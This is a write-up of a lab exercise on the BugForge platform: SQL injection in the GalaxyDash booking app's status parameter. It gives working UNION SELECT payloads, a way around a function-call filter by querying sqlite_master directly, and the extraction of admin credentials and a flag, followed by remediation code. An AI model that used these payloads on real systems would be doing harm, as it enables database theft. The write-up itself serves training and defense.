---
layout: default
title: "GalaxyDash (SQLi - Function Filter Bypass) - BugForge"
---

[← Back](./)

# BugForge - GalaxyDash Lab Writeup

<div class="meta">
  <span><strong>Date:</strong> 2026-03-07</span>
  <span><strong>Difficulty:</strong> Medium</span>
  <span><strong>Platform:</strong> BugForge</span>
</div>

---

## Executive Summary

**Overall Risk Rating:** 🔴 Critical

**Key Findings:**
1. SQL Injection in `/api/bookings?status=` query parameter (CWE-89)
2. Ineffective function-call filter bypassed with direct FROM clause (CWE-943)
3. Plaintext credential storage in users table (CWE-312)

**Business Impact:** Full database compromise — attacker can extract all user credentials, booking data, and sensitive business information through a trivially exploitable injection point.

---

## Objective
Exploit a SQL injection vulnerability in the GalaxyDash cargo booking application to extract sensitive data from the database.

## Initial Access
```bash
# Target Application
URL: https://lab-1772915595448-irt6s3.labs-app.bugforge.io

# Credentials
Registered account: haxor
JWT Bearer token for API authentication
```

## Key Findings
### Critical & High-Risk Vulnerabilities
1. **CWE-89** - SQL Injection via `?status=` query parameter
2. **CWE-943** - Improper Neutralization of Special Elements in Data Query Logic (filter bypass)
3. **CWE-312** - Cleartext Storage of Sensitive Information

**CVSS v3.1 Score for SQL Injection:** **9.8 (Critical)**

| Metric | Value |
|--------|-------|
| Attack Vector | Network |
| Attack Complexity | Low |
| Privileges Required | Low |
| User Interaction | None |
| Scope | Unchanged |
| Confidentiality | High |
| Integrity | High |
| Availability | High |

## Enumeration Summary
### Application Analysis
**Target Endpoints Discovered:**
- `GET /api/bookings?status=` — Filterable booking list (injection point)
- `GET /api/bookings/:id` — Individual booking with notes
- `POST /api/bookings` — Create new cargo bookings
- Auth: JWT Bearer (HS256) with user ID, username, organizationId

## Attack Chain Visualization
```
┌─────────────────────┐     ┌──────────────────────┐     ┌─────────────────────┐
│  Reconnaissance     │────▶│  Injection Discovery │────▶│  Filter Analysis    │
│  Map API endpoints  │     │  ?status=pending'    │     │  Functions blocked  │
│  /api/bookings      │     │  Error confirms SQLi │     │  Subselects blocked │
└─────────────────────┘     └──────────────────────┘     └─────────────────────┘
                                                                   │
                                                                   ▼
┌─────────────────────┐     ┌──────────────────────┐     ┌─────────────────────┐
│  Flag Captured      │◀────│  Data Extraction     │◀────│  Bypass Discovery   │
│  Admin creds + flag │     │  UNION SELECT w/     │     │  Direct FROM clause │
│  from users table   │     │  LIMIT/OFFSET enum   │     │  No subselect needed│
└─────────────────────┘     └──────────────────────┘     └─────────────────────┘
```

**Attack Path Summary:**
1. Discovered `?status=` parameter accepts unsanitized input
2. Confirmed injection with single quote error and boolean-based test
3. Determined 26-column UNION requirement
4. Identified function/subselect filter blocking standard enumeration
5. Bypassed filter using direct FROM clause on sqlite_master
6. Enumerated tables and extracted admin credentials with flag

---

## Exploitation Path
### Step 1: Identify Injectable Parameter
The `/api/bookings?status=pending` endpoint filters bookings by status. Lab hint: "Some customers complained about the order status."

Testing with a single quote:
```http
GET /api/bookings?status=pending' HTTP/1.1
Host: lab-1772915595448-irt6s3.labs-app.bugforge.io
Authorization: Bearer <jwt>
```
**Result:** Database error — confirms string injection in WHERE clause.

Boolean confirmation:
```http
GET /api/bookings?status=pending' OR 1=1-- HTTP/1.1
```
**Result:** Returned bookings or empty array.

### Step 2: Determine Column Count
Used ORDER BY to binary search for column count:
```sql
' order by 26--   -- Works
' order by 27--   -- Error
```
**Result:** 26 columns confirmed.

### Step 3: Map Output Positions
```http
GET /api/bookings?status=pending' union select 1,2,3,...,26-- HTTP/1.1
```
**Result:** All 26 positions visible. Key mappings: status=18, created_at=19, created_by_username=26.

**Important:** NULL values caused database errors — the ORM layer enforces column types. Must use integer placeholders.

### Step 4: Discover and Analyze the Filter
Standard SQLite enumeration techniques all failed:

```
ALL BLOCKED:
- sqlite_version()          -- function call
- (SELECT name FROM ...)    -- subselect
- group_concat(name)        -- aggregate function
- abs(1)                    -- even simple functions
- SqLiTe_VeRsIoN()         -- case variation
- sqlite_version/**/()      -- comment bypass
```

Systematic testing revealed:
- String literals pass: `'test'`, `'select'`, `'from'`
- Numbers in parentheses pass: `(1)`
- **Any function call blocked:** pattern is `word()` — a word followed by parentheses
- **Any subselect blocked:** `(SELECT ...)` matches the same pattern

### Step 5: Bypass with Direct FROM Clause
Instead of using subselects or aggregate functions, make sqlite_master the FROM table for the entire UNION query:

```http
GET /api/bookings?status=pending' union select 1,2,...,17,name,19,...,26 from sqlite_master limit 1-- HTTP/1.1
```
**Result:** First table name returned. Iterated with `LIMIT 1 OFFSET N` to enumerate all tables. Discovered "users" table.

### Step 6: Extract Credentials and Flag
```http
GET /api/bookings?status=pending' union select 1,2,...,17,username,password,20,...,26 from users limit 1 offset 0-- HTTP/1.1
```

**Response:**
```json
{
    "status": "bchow_admin",
    "created_at": "bug{8aLnNWaCxrXUKqyJWXHrAIIYFqyTcbf4}"
}
```

---

## Flag / Objective Achieved
✅ **Flag:** `bug{8aLnNWaCxrXUKqyJWXHrAIIYFqyTcbf4}`
✅ **Admin credentials extracted:** `bchow_admin`

---

## Key Learnings
- **Function filters are not WAFs** — this app blocked `word()` patterns but allowed all SQL keywords as string literals and direct column references
- **Direct FROM beats subselects** — when subselects are blocked, use the target table as the UNION's own FROM clause with LIMIT/OFFSET for iteration
- **Type-sensitive UNION** — SQLite is loosely typed but the Express ORM layer enforced types; NULL failed where integers worked
- **Hint interpretation matters** — "customers complained about the order status" pointed directly to the `?status=` query parameter
- **group_concat() isn't the only way** — when aggregate functions are blocked, LIMIT 1 OFFSET N iteration achieves the same enumeration
- **Systematic filter analysis** — testing string literals, numbers, parentheses, and functions separately revealed the exact filter pattern quickly

---

## Tools Used
- **Caido** — Request interception and Repeater for testing injection payloads
- **SQLMap** — Ran in parallel (did not find the bypass — manual testing required)
- **Firefox + PwnFox** — Initial app reconnaissance and request capture

---

## Remediation
### 1. SQL Injection (CVSS: 9.8 - Critical)
**Issue:** User-supplied status query parameter concatenated directly into SQL query string.
**CWE Reference:** CWE-89 - Improper Neutralization of Special Elements used in an SQL Command
**Fix:**
```javascript
// BEFORE (Vulnerable)
const query = `SELECT * FROM bookings WHERE status = '${req.query.status}'`;

// AFTER (Secure)
const query = `SELECT * FROM bookings WHERE status = ?`;
db.all(query, [req.query.status]);
```

### 2. Ineffective Input Filter (CVSS: 5.3 - Medium)
**Issue:** Function call pattern filter is trivially bypassed by restructuring queries to avoid subselects.
**CWE Reference:** CWE-943 - Improper Neutralization of Special Elements in Data Query Logic
**Fix:** Use parameterized queries instead of input filtering. Blocklist-based filters are always bypassable.

### 3. Plaintext Credential Storage (CVSS: 7.5 - High)
**Issue:** User passwords stored in plaintext in the users table.
**CWE Reference:** CWE-312 - Cleartext Storage of Sensitive Information
**Fix:**
```javascript
// BEFORE (Vulnerable)
await db.run('INSERT INTO users (password) VALUES (?)', [password]);

// AFTER (Secure)
const hash = await bcrypt.hash(password, 12);
await db.run('INSERT INTO users (password) VALUES (?)', [hash]);
```

---

## Failed Attempts
### Approach 1: UNION with NULL Values
```
' UNION SELECT null,null,...,null FROM sqlite_master--
```
**Result:** ❌ Failed - ORM/app layer enforced column types, NULLs not accepted

### Approach 2: Standard Function Calls
```
sqlite_version()
group_concat(name)
abs(1)
```
**Result:** ❌ Failed - Server-side filter blocks function call syntax (word + parentheses)

### Approach 3: Subselects
```
(SELECT name FROM sqlite_master LIMIT 1)
```
**Result:** ❌ Failed - Same filter blocks nested SELECT statements in parentheses

### Approach 4: Case Variation Bypass
```
SqLiTe_VeRsIoN()
SeLeCt name FrOm sqlite_master
```
**Result:** ❌ Failed - Filter is case-insensitive

### Approach 5: Comment/Whitespace Bypass
```
sqlite_version/**/()
abs (1)
```
**Result:** ❌ Failed - Filter not whitespace-dependent

### Approach 6: Double-Quoted Function Names
```
"sqlite_version"()
```
**Result:** ❌ Failed - SQLite treated double-quoted name as string literal, returned "sqlite_version" as text

---

## OWASP Top 10 Coverage
- **A03:2021** - Injection (Primary: unsanitized query parameter in SQL query)
- **A04:2021** - Insecure Design (Reliance on function-name filter instead of parameterized queries)
- **A02:2021** - Cryptographic Failures (Plaintext password storage)

---

## References
**SQLite Injection Resources:**
- [PayloadsAllTheThings - SQLite Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [SQLite SELECT Documentation](https://www.sqlite.org/lang_select.html)

---

**Tags:** `#sqli` `#sqlite` `#filter-bypass` `#union-select` `#bugforge` `#ctf`
